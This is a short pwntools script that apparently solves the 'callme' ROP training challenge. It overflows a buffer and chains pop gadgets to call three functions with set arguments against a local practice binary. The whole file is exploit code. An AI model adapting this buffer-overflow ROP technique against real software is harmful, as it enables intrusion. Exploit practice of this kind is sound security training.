from pwn import *
e = ELF("./callme")
callme_one = p64(e.symbols["callme_one"])
callme_two = p64(e.symbols["callme_two"])
callme_three = p64(e.symbols["callme_three"])
pop_rdi = p64(0x0000000000401b23)
pop_rsi_rdx = p64(0x0000000000401ab1)
p = process("./callme")
print p.recv()
payload = "a"*40
payload += pop_rdi+p64(1)+pop_rsi_rdx+p64(2)+p64(3)+callme_one
payload += pop_rdi+p64(1)+pop_rsi_rdx+p64(2)+p64(3)+callme_two
payload += pop_rdi+p64(1)+pop_rsi_rdx+p64(2)+p64(3)+callme_three

p.sendline(payload)
print p.recv()
p.interactive()


